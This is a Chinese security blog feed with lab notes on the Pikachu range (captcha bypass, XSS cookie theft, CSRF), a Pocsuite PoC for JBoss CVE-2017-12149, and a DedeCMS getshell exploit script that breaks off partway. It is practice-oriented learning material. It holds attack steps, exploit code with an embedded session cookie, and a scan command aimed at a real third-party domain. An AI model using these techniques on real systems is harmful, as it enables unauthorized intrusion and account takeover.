data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/14.png" class="lazyload"><br>把验证码直接删掉，重放查看一下回显。<br>可以直接看到不需要输入验证码也直接进行了账号密码的查询判断。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/15.png" class="lazyload"></p><p>所以爆破的时候可以直接忽视验证码，进行对账号密码的爆破就可以了，和上面的一样，就不再做一次了。</p><h3 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h3><p>在后端进行验证码的判断。</p><p>看一下界面。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/16.png" class="lazyload"><br>发送到重放模块。看一下<br>放数据包，提示密码错误。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/17.png" class="lazyload"><br>修改一下密码再发送一次。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/18.png" class="lazyload"><br>发现保持验证码不变，可以一直进行测试，验证码的时效很长。可以一直使用同一个验证码进行爆破。<br>密码爆破成功。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/19.png" class="lazyload"><br>这里漏洞产生的原因是验证码的时效性的问题，没做到验证码一次一用，所以使得账号密码可以被爆破。</p><h2 id="XSS（跨站脚本）"><a href="#XSS（跨站脚本）" class="headerlink" title="XSS（跨站脚本）"></a>XSS（跨站脚本）</h2><p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：<br>    1.反射性XSS;<br>    2.存储型XSS;<br>    3.DOM型XSS;</p><p>XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。<br>XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。<br>形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。<br>因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:<br>    输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;<br>    输出转义：根据输出点的位置对输出到前端的内容进行适当转义;</p><h3 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型xss(get)</h3><p>看一下界面。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/1.gif" class="lazyload"><br>输入的内容会被加到下面的一句话里面输出出来。</p><p>测试写上一个xss弹窗代码。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/20.png" class="lazyload"><br>     做了输入限制，看一下界面代码。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/21.png" class="lazyload"><br>    前端做了输入的长度限制，在前端做得限制都是不安全的，客户可以进行修改。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/22.png" class="lazyload"><br>    弹窗成功！<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/23.png" class="lazyload"><br>    是一个get的xss反射，我们可以通过输入盗取cookie的JavaScript代码，发送带有盗取cookie的链接给别人盗取别人的cookie。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/24.png" class="lazyload"><br>    盗取cookie可搭建xss平台，然后生成盗取代码将盗取到的cookie发送到平台上。</p><h3 id="反射性xss-post"><a href="#反射性xss-post" class="headerlink" title="反射性xss(post)"></a>反射性xss(post)</h3><p>看一下界面。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/25.png" class="lazyload"><br>测试写上一个xss弹窗代码。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/26.png" class="lazyload"><br>是以post请求方式发送的。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/27.png" class="lazyload"></p><p>这个漏洞的方法，别人教的我觉得有点鸡肋，是搭建一个web页面，页面的内容在访问这个页面的时候想这个漏洞页面发送一个post请求将cookie劫持到xss平台。</p><h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h3><p>DOM是纯前端的操作，不涉及后台。在这个靶场下利用起来比较鸡肋。<br>只有在第二个环境下有个类似get型xss的利用。就不想做了。<br>然后自己看看网上的关于DOM型xss利用方式，看到了一个dvwa靶场的xss可以在DOM型xss哪里直接将cookie反弹到kali的nc下。<br>这里就留个链接，后面再练习。<br><a href="https://blog.csdn.net/ski_12/article/details/60468362">https://blog.csdn.net/ski_12/article/details/60468362</a></p><h3 id="xss盲打"><a href="#xss盲打" class="headerlink" title="xss盲打"></a>xss盲打</h3><p>这里是一个设想的环境，前端输入的xss，在后台直接执行，自己不知道会不会成功。不做了。</p><h3 id="xss之过滤"><a href="#xss之过滤" class="headerlink" title="xss之过滤"></a>xss之过滤</h3><p>过滤主要看黑盒测试的水平了，判断源码对什么进行了过滤再进行绕过。这个靶场就只是做了一个对script的过滤，只要通过大小写绕过就可以了。<br>这个靶场只是让我们了解一下，更深的得自己去琢磨。</p><h3 id="xss的键盘记录"><a href="#xss的键盘记录" class="headerlink" title="xss的键盘记录"></a>xss的键盘记录</h3><p>这里我没做，但是看了教程做了笔记。<br>通过异步同步将键盘输入提交到自己搭建的xss的平台，要允许同源策略请求。</p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>CSRF(跨站请求伪造)概述<br>    Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。<br>  在csrf的攻击场景中，攻击者会伪造一个请求，然后欺骗目标用户点击，用于一旦点击，整个攻击就完成了。<br>  csrf是借用户的权限完成攻击，攻击者并没有拿到用户的权限。</p><h3 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h3><p>靶场的这个场景是在用在在登录状态下做信息修改，然后将修改的内容通过URL发送给其他用户，用户点击以后也就执行了该操作。下面图片演示一下：<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/28.png" class="lazyload"></p><p>这里进行修改电话信息，看到修改请求是通过get传输的<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/29.png" class="lazyload"></p><p>然后我们退出当前用户，登录lili该账户，然后再点击伪造过后的url。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/2.gif" class="lazyload"><br>此处通过lili账户登录态点击url，执行修改电话操作，将电话号码修改成110。</p><h3 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h3><p>post请求的利用，搭建一个web网站，后端伪造一个post的请求包，让受害者在登录态下触发发送就可以实现csrf攻击。</p><h3 id="CSRF（自己的总结）"><a href="#CSRF（自己的总结）" class="headerlink" title="CSRF（自己的总结）"></a>CSRF（自己的总结）</h3><p>如何确认一个web系统存在csrf漏洞。<br>1，对目标网站增删改的地方进行标记，并观察其逻辑，判断请求是否可以伪造。<br>2，确认凭证的有效期</p><h1 id="——未完待续——"><a href="#——未完待续——" class="headerlink" title="——未完待续——"></a>——未完待续——</h1>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在pikachu靶场练习一下，复习一下漏洞。&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透" scheme="/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透" scheme="/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Pocsuite的使用</title>
    <link href="/2018/10/23/Pocsuite%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>/2018/10/23/Pocsuite的使用/</id>
    <published>2018-10-23T04:00:00.000Z</published>
    <updated>2019-04-27T07:50:27.719Z</updated>
    
    <content type="html"><![CDATA[<p>Pocsuite 是知道创宇安全研究团队打造的一款基于漏洞与 PoC 的远程漏洞验证框架。Pocsuite 是知道创宇安全研究团队发展的基石，是团队发展至今持续维护的一个重要项目，保障了我们的 Web 安全研究能力的领先。</p><a id="more"></a><h2 id="Pocsuite的安装"><a href="#Pocsuite的安装" class="headerlink" title="Pocsuite的安装"></a>Pocsuite的安装</h2><p>下载Pocsuite<br>下载地址：<br>链接：<a href="https://github.com/knownsec/pocsuite">https://github.com/knownsec/pocsuite</a></p><p><strong>操作系统 Ubuntu</strong></p><p>下载后拖进去，直接进到目录就可以使用了，需要安装python2环境，当你写的poc使用到第三方包的时候需要自己安装</p><h2 id="Pocsuite的使用"><a href="#Pocsuite的使用" class="headerlink" title="Pocsuite的使用"></a>Pocsuite的使用</h2><p>这里有使用文档。<br><a href="https://www.seebug.org/help/dev">https://www.seebug.org/help/dev</a></p><h2 id="Pocsuite-poc编写"><a href="#Pocsuite-poc编写" class="headerlink" title="Pocsuite poc编写"></a>Pocsuite poc编写</h2><p>文档里面写的很清楚，不过是因为我昨晚自己一下子没能理解，后来今天写出来了一个poc，就讲一下。</p><h3 id="verify函数"><a href="#verify函数" class="headerlink" title="verify函数"></a>verify函数</h3><p>这个是验证poc的函数，其实写法很自由的，就是你理解漏洞原理以后用代码去验证，只是我昨晚一直不明白，我写了poc以后如何使得他返还success。<br>先给你看我写的验证函数吧，其实就是前面jboss漏洞验证的原理。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_verify</span><span class="params">(self)</span>:</span></span><br><span class="line">       result = &#123;&#125;  <span class="comment"># result是返回结果</span></span><br><span class="line">       <span class="comment"># 验证代码</span></span><br><span class="line">       httpurl = self.url + <span class="string">'/invoker/readonly'</span></span><br><span class="line">       NETWORK_STATUS = <span class="literal">True</span></span><br><span class="line">       r = requests.get(httpurl, timeout=<span class="number">1</span>)  <span class="comment"># 加一个1s的时间限制，不然超时异常太久了</span></span><br><span class="line">       zt = r.status_code</span><br><span class="line">       <span class="keyword">if</span> zt == <span class="number">500</span>:</span><br><span class="line">           vulurl = (httpurl)  <span class="comment"># if判断，当存在漏洞的时候将当前url+/invoker/readonly赋值给vulurl作为后面的result判断</span></span><br><span class="line">       <span class="keyword">if</span> zt == <span class="number">500</span>:</span><br><span class="line">           result[<span class="string">'VerifyInfo'</span>] = &#123;&#125;</span><br><span class="line">           result[<span class="string">'VerifyInfo'</span>][<span class="string">'URL'</span>] = vulurl</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> self.parse_attack(result)</span><br></pre></td></tr></table></figure><h4 id="代码解释"><a href="#代码解释" class="headerlink" title="代码解释"></a>代码解释</h4><p>验证部分不解释，博客解释过了，主要是我在这里做了一个改动。<br>当漏洞存在的时候（ps：也就是网页状态码是500的时候），我将(httpurl + ‘/invoker/readonly’)赋值给vulurl。<br>为什么这样做呢。<br>因为按照语法规则，result 的key值是有严格规定的，他最后只会返回以上内容。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">result 每个 key 值相对应的意义：</span><br><span class="line"></span><br><span class="line">    correspond：[</span><br><span class="line"></span><br><span class="line">    &#123;  <span class="attr">name</span>: <span class="string">'DBInfo'</span>,        value：<span class="string">'数据库内容'</span> &#125;,</span><br><span class="line">        &#123;  <span class="attr">name</span>: <span class="string">'Username'</span>,      <span class="attr">value</span>: <span class="string">'管理员用户名'</span>&#125;,</span><br><span class="line">        &#123;  <span class="attr">name</span>: <span class="string">'Password'</span>,      value：<span class="string">'管理员密码'</span> &#125;,</span><br><span class="line">        &#123;  <span class="attr">name</span>: <span class="string">'Salt'</span>,          <span class="attr">value</span>: <span class="string">'加密盐值'</span>&#125;,</span><br><span class="line">        &#123;  <span class="attr">name</span>: <span class="string">'Uid'</span>,           <span class="attr">value</span>: <span class="string">'用户ID'</span>&#125;,</span><br><span class="line">        &#123;  <span class="attr">name</span>: <span class="string">'Groupid'</span>,       <span class="attr">value</span>: <span class="string">'用户组ID'</span>&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  <span class="attr">name</span>: <span class="string">'ShellInfo'</span>,     <span class="attr">value</span>: <span class="string">'Webshell信息'</span>&#125;,</span><br><span class="line">        &#123;  <span class="attr">name</span>: <span class="string">'URL'</span>,           <span class="attr">value</span>: <span class="string">'Webshell地址'</span>&#125;,</span><br><span class="line">        &#123;  <span class="attr">name</span>: <span class="string">'Content'</span>,       <span class="attr">value</span>: <span class="string">'Webshell内容'</span>&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  <span class="attr">name</span>: <span class="string">'FileInfo'</span>,      <span class="attr">value</span>: <span class="string">'文件信息'</span>&#125;,</span><br><span class="line">        &#123;  <span class="attr">name</span>: <span class="string">'Filename'</span>,      <span class="attr">value</span>: <span class="string">'文件名称'</span>&#125;,</span><br><span class="line">        &#123;  <span class="attr">name</span>: <span class="string">'Content'</span>,       <span class="attr">value</span>: <span class="string">'文件内容'</span>&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  <span class="attr">name</span>: <span class="string">'XSSInfo'</span>,       <span class="attr">value</span>: <span class="string">'跨站脚本信息'</span>&#125;,</span><br><span class="line">        &#123;  <span class="attr">name</span>: <span class="string">'URL'</span>,           <span class="attr">value</span>: <span class="string">'验证URL'</span>&#125;,</span><br><span class="line">        &#123;  <span class="attr">name</span>: <span class="string">'Payload'</span>,       <span class="attr">value</span>: <span class="string">'验证Payload'</span>&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  <span class="attr">name</span>: <span class="string">'AdminInfo'</span>,     <span class="attr">value</span>: <span class="string">'管理员信息'</span>&#125;,</span><br><span class="line">        &#123;  <span class="attr">name</span>: <span class="string">'Uid'</span>,           <span class="attr">value</span>: <span class="string">'管理员ID'</span>&#125;,</span><br><span class="line">        &#123;  <span class="attr">name</span>: <span class="string">'Username'</span>,      <span class="attr">value</span>: <span class="string">'管理员用户名'</span>&#125;,</span><br><span class="line">        &#123;  <span class="attr">name</span>: <span class="string">'Password'</span>,      <span class="attr">value</span>: <span class="string">'管理员密码'</span>&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  <span class="attr">name</span>: <span class="string">'Database'</span>,      value：<span class="string">'数据库信息'</span> &#125;,</span><br><span class="line">        &#123;  <span class="attr">name</span>: <span class="string">'Hostname'</span>,      <span class="attr">value</span>: <span class="string">'数据库主机名'</span>&#125;,</span><br><span class="line">        &#123;  <span class="attr">name</span>: <span class="string">'Username'</span>,      value：<span class="string">'数据库用户名'</span> &#125;,</span><br><span class="line">        &#123;  <span class="attr">name</span>: <span class="string">'Password'</span>,      <span class="attr">value</span>: <span class="string">'数据库密码'</span>&#125;,</span><br><span class="line">        &#123;  <span class="attr">name</span>: <span class="string">'DBname'</span>,        <span class="attr">value</span>: <span class="string">'数据库名'</span>&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  <span class="attr">name</span>: <span class="string">'VerifyInfo'</span>,    <span class="attr">value</span>: <span class="string">'验证信息'</span>&#125;,</span><br><span class="line">        &#123;  <span class="attr">name</span>: <span class="string">'URL'</span>,           <span class="attr">value</span>: <span class="string">'验证URL'</span>&#125;,</span><br><span class="line">        &#123;  <span class="attr">name</span>: <span class="string">'Postdata'</span>,      <span class="attr">value</span>: <span class="string">'验证POST数据'</span>&#125;,</span><br><span class="line">        &#123;  <span class="attr">name</span>: <span class="string">'Path'</span>,          <span class="attr">value</span>: <span class="string">'网站绝对路径'</span>&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  <span class="attr">name</span>: <span class="string">'SiteAttr'</span>,      <span class="attr">value</span>: <span class="string">'网站服务器信息'</span>&#125;,</span><br><span class="line">    &#123;  <span class="attr">name</span>: <span class="string">'Process'</span>,       <span class="attr">value</span>: <span class="string">'服务器进程'</span>&#125;</span><br><span class="line"></span><br><span class="line">    ]</span><br></pre></td></tr></table></figure><p> result就是返回你进行poc验证以后返回的信息，但是我返还的状态码500不在key值内，于是乎我在验证存在漏洞以后将vulurl赋值成验证后的url，只要返还的信息和VerifyInfo的url相等就会返还success。</p><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pocsuite -r jboss-_CVE<span class="number">-2017</span><span class="number">-12149.</span>py -u www.baidu.com --verify</span><br></pre></td></tr></table></figure><p>使用pocsuite对站点进行poc验证。你调用另一个函数_attack的时候就是攻击了。<br><img alt data-src="/images/Pocsuite%E7%9A%84%E4%BD%BF%E7%94%A8/1.png" class="lazyload"><br><img alt data-src="/images/Pocsuite%E7%9A%84%E4%BD%BF%E7%94%A8/3.png" class="lazyload"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pocsuite.py -r modules/qykcms_4_3_2_front_boolean_sqli.py -f qykcms.txt --threads <span class="number">5</span></span><br></pre></td></tr></table></figure><p>批量验证，指定某个txt文本内的url进行验证，调用5个线程。<br><img alt data-src="/images/Pocsuite%E7%9A%84%E4%BD%BF%E7%94%A8/2.png" class="lazyload"></p><h2 id="附上源码"><a href="#附上源码" class="headerlink" title="附上源码"></a>附上源码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pocsuite.net <span class="keyword">import</span> req</span><br><span class="line"><span class="keyword">from</span> pocsuite.poc <span class="keyword">import</span> POCBase, Output</span><br><span class="line"><span class="keyword">from</span> pocsuite.utils <span class="keyword">import</span> register</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestPOC</span><span class="params">(POCBase)</span>:</span></span><br><span class="line">    vulID = <span class="string">'1'</span>  <span class="comment"># VUL ID</span></span><br><span class="line">    version = <span class="string">'1'</span>  <span class="comment"># 默认为1</span></span><br><span class="line">    author = <span class="string">'9finger'</span>  <span class="comment"># PoC 作者的大名</span></span><br><span class="line">    vulDate = <span class="string">'2018-10-20'</span>  <span class="comment"># 漏洞公开的时间,不知道就写今天</span></span><br><span class="line">    createDate = <span class="string">'2018-10-20'</span>  <span class="comment"># 编写 PoC 的日期</span></span><br><span class="line">    updateDate = <span class="string">'2018-10-20'</span>  <span class="comment"># POC更新的时间,默认和编写时间一样</span></span><br><span class="line">    references = [</span><br><span class="line">        <span class="string">'#'</span>]  <span class="comment"># 漏洞地址来源,0day 不用写</span></span><br><span class="line">    name = <span class="string">'CVE-2017-12149'</span>  <span class="comment"># PoC 名称</span></span><br><span class="line">    appPowerLink = <span class="string">'#'</span>  <span class="comment"># 漏洞厂商主页地址</span></span><br><span class="line">    appName = <span class="string">'JBoss5.x6.x 反序列化漏洞'</span>  <span class="comment"># 漏洞应用名称</span></span><br><span class="line">    appVersion = <span class="string">'5.x6.x'</span>  <span class="comment"># 漏洞影响版本</span></span><br><span class="line">    vulType = <span class="string">'Java反序列化'</span>  <span class="comment"># 漏洞类型,类型参考见 漏洞类型规范表</span></span><br><span class="line">    desc = <span class="string">'''</span></span><br><span class="line"><span class="string">            ###</span></span><br><span class="line"><span class="string">        '''</span>  <span class="comment"># 漏洞简要描述</span></span><br><span class="line">    samples = []  <span class="comment"># 测试样例,就是用 PoC 测试成功的网站，选填</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_attack</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''attack mode'''</span></span><br><span class="line">        <span class="keyword">return</span> self._verify()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_verify</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;  <span class="comment"># result是返回结果</span></span><br><span class="line">        <span class="comment"># 验证代码</span></span><br><span class="line">        httpurl = self.url + <span class="string">'/invoker/readonly'</span></span><br><span class="line">        NETWORK_STATUS = <span class="literal">True</span></span><br><span class="line">        r = requests.get(httpurl, timeout=<span class="number">1</span>)  <span class="comment"># 加一个1s的时间限制，不然超时异常太久了</span></span><br><span class="line">        zt = r.status_code</span><br><span class="line">        <span class="keyword">if</span> zt == <span class="number">500</span>:</span><br><span class="line">            vulurl = (httpurl)  <span class="comment"># if判断，当存在漏洞的时候将当前url+/invoker/readonly赋值给vulurl作为后面的result判断</span></span><br><span class="line">        <span class="keyword">if</span> zt == <span class="number">500</span>:</span><br><span class="line">            result[<span class="string">'VerifyInfo'</span>] = &#123;&#125;</span><br><span class="line">            result[<span class="string">'VerifyInfo'</span>][<span class="string">'URL'</span>] = vulurl</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> self.parse_attack(result)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_attack</span><span class="params">(self, result)</span>:</span></span><br><span class="line">        output = Output(self)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output.fail(<span class="string">'Internet nothing returned'</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register(TestPOC)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Pocsuite 是知道创宇安全研究团队打造的一款基于漏洞与 PoC 的远程漏洞验证框架。Pocsuite 是知道创宇安全研究团队发展的基石，是团队发展至今持续维护的一个重要项目，保障了我们的 Web 安全研究能力的领先。&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透" scheme="/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透" scheme="/tags/%E6%B8%97%E9%80%8F/"/>
    
      <category term="Python" scheme="/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>DedeCMS V5.7 SP2 getshell exp 练手</title>
    <link href="/2018/10/12/DedeCMS%20V5.7%20SP2%20getshell%20exp%20%E7%BB%83%E6%89%8B/"/>
    <id>/2018/10/12/DedeCMS V5.7 SP2 getshell exp 练手/</id>
    <published>2018-10-12T04:00:00.000Z</published>
    <updated>2019-04-27T07:49:36.723Z</updated>
    
    <content type="html"><![CDATA[<p>自己练手写了一个exp，说实话有点鸡肋，不过反正是练手嘛。</p><a id="more"></a><h2 id="DedeCMS-V5-7-SP2后台代码执行漏洞拿webshell"><a href="#DedeCMS-V5-7-SP2后台代码执行漏洞拿webshell" class="headerlink" title="DedeCMS V5.7 SP2后台代码执行漏洞拿webshell"></a>DedeCMS V5.7 SP2后台代码执行漏洞拿webshell</h2><p>漏洞不是我审计出来的，只是他没写exp，我自己练手写了。<br>参考网站：<a href="https://www.0dayhack.com/post-806.html">https://www.0dayhack.com/post-806.html</a></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><p><strong>操作系统 Windows10</strong></p><h3 id="编译器"><a href="#编译器" class="headerlink" title="编译器"></a>编译器</h3><p><strong>pycharm</strong></p><h3 id="Python版本"><a href="#Python版本" class="headerlink" title="Python版本"></a>Python版本</h3><p><strong>Python3</strong></p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>这次函数都没定义，写得一点都不规范。</p><h3 id="带上已经登入后的cookie再次请求"><a href="#带上已经登入后的cookie再次请求" class="headerlink" title="带上已经登入后的cookie再次请求"></a>带上已经登入后的cookie再次请求</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">host = <span class="string">'http://127.0.0.1'</span>  <span class="comment"># 织梦的网址</span></span><br><span class="line">cookie = <span class="string">"menuitems=1_1%2C2_1%2C3_1; hd_sid=gkwZpM; DedeUserID=1; DedeUserID__ckMd5=21525998e2bf23ac; PHPSESSID=a8vetc0q9j1jr0glocmr9iaq47; DedeLoginTime=1539255891; DedeLoginTime__ckMd5=c98838290139737e; _csrf_name_13a77a19=cca919ac2d38b7a95be29c2215f26b09; _csrf_name_13a77a19__ckMd5=0cab530703fcb0ac"</span>  <span class="comment"># 输入cookie</span></span><br><span class="line">headers = &#123;<span class="string">'Cookie'</span>: cookie&#125;  <span class="comment"># 在headers头添加cookie</span></span><br><span class="line">rs = requests.get(host + <span class="string">'/dede/tpl.php?action=upload  '</span>, headers=headers)  <span class="comment"># 带上cookie请求后台上传网址</span></span><br></pre></td></tr></table></figure><p>![](/images/DedeCMS V5.7 SP2 getshell exp 练手/1.png)<br>打开浏览器，登录后台以后，按f12开发人员工具，点击network，查看流量包，查看里面的cookie。<br>cookie：<br><strong>Cookie，有时也用其复数形式 Cookies，指某些网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据（通常经过加密）。定义于 RFC2109 和 2965 中的都已废弃，最新取代的规范是 RFC6265 [1]  。（可以叫做浏览器缓存）</strong></p><h3 id="获取token的值"><a href="#获取token的值" class="headerlink" title="获取token的值"></a>获取token的值</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">soup = BeautifulSoup(rs.text, <span class="string">'html.parser'</span>)  <span class="comment"># 获取网页源码</span></span><br><span class="line">width = soup.find(width=<span class="string">"504"</span>)  <span class="comment"># 查找width="504"的内容</span></span><br><span class="line">width1 = str(width)  <span class="comment"># 将获取到的内容进行类型强转</span></span><br><span class="line">rex = <span class="string">r"(?&lt;=input name=\"token\" type=\"hidden\" value=\").*(?=\")"</span>  <span class="comment"># 利用re模块匹配token的值</span></span><br><span class="line">result = re.finditer(rex, width1, flags=re.M)</span><br><span class="line"><span class="keyword">for</span> match <span class="keyword">in</span> result:</span><br><span class="line">    token = match.group()</span><br></pre></td></tr></table></figure><p>这个其实是用前面博客学到的东西来写的，用BeautifulSoup模块和re模块进行内容的获取。<br>附上运行的图理解一下：<br>![](/images/DedeCMS V5.7 SP2 getshell exp 练手/2.png)<br>![](/images/DedeCMS V5.7 SP2 getshell exp 练手/3.png)</p><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td 